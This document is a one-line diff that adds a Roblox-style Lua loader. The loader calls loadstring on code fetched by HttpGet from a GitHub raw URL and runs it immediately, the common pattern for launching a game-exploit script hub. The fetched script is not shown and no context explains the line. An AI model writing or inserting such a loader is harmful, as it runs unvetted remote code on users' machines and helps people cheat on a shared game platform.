@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/FryzerHub/Biggestscript/refs/heads/main/script"))()
